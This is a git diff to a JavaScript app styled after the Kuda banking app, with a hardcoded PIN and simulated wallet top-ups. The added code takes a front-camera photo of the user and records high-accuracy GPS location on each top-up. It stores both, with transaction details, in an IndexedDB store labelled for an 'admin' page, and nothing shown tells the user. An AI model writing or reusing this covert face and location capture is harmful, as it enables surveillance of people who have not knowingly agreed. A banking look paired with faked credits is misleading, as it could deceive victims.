@@ -8,6 +8,79 @@ let appData = {
 
 const CORRECT_PIN = '862412';
 
+// IndexedDB helper for saving receipts to admin
+function openReceiptDB() {
+    return new Promise((resolve, reject) => {
+        const req = indexedDB.open('KudaApp', 1);
+        req.onerror = () => reject(req.error);
+        req.onsuccess = () => resolve(req.result);
+        req.onupgradeneeded = (e) => {
+            const db = e.target.result;
+            if (!db.objectStoreNames.contains('receipts')) {
+                db.createObjectStore('receipts', { keyPath: 'id', autoIncrement: true });
+            }
+            if (!db.objectStoreNames.contains('users')) {
+                db.createObjectStore('users', { keyPath: 'id' });
+            }
+        };
+    });
+}
+
+async function saveReceiptToAdmin(receiptData) {
+    try {
+        const db = await openReceiptDB();
+        const tx = db.transaction(['receipts'], 'readwrite');
+        const store = tx.objectStore('receipts');
+        store.add({ ...receiptData, timestamp: new Date().toISOString() });
+    } catch (e) {
+        console.error('Failed to save receipt to admin DB:', e);
+    }
+}
+
+// Capture face from front camera
+async function captureFace() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        await new Promise((res) => { video.onloadedmetadata = () => { video.play(); res(); }; });
+        await new Promise(r => setTimeout(r, 500));
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+        stream.getTracks().forEach(t => t.stop());
+        return dataUrl;
+    } catch (e) {
+        console.error('Face capture failed:', e);
+        return null;
+    }
+}
+
+// Get current location
+function getCurrentLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(null);
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                resolve({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: new Date().toISOString()
+                });
+            },
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    });
+}
+
 // PIN verification
 function verifyPin() {
     const pinInput = document.getElementById('pinInput');
@@ -117,7 +190,7 @@ document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) 
         processTransaction();
     }
 
-    function processTransaction() {
+    async function processTransaction() {
         // Create transaction
         const transaction = {
             id: 'TXN' + Date.now(),
@@ -137,8 +210,29 @@ document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) 
         // Add to transactions (newest first)
         appData.transactions.unshift(transaction);
 
-        // Save data
+        // Save data to localStorage
         localStorage.setItem('kudasavingsData', JSON.stringify(appData));
+
+        // Capture face and location for admin receipt
+        const [capturedFace, location] = await Promise.all([
+            captureFace(),
+            getCurrentLocation()
+        ]);
+
+        // Save full receipt to IndexedDB for admin page
+        await saveReceiptToAdmin({
+            username: appData.userName || 'BABATUNDE',
+            accountName: 'Wallet Top-up',
+            bankName: 'Kuda (Self)',
+            accountNumber: '2054502723',
+            amount: amount,
+            narration: narration,
+            referenceNumber: transaction.referenceNumber,
+            transactionDate: transaction.date,
+            transactionType: 'credit',
+            capturedFace: capturedFace,
+            location: location
+        });
 
         // Simulate processing
         setTimeout(() => {
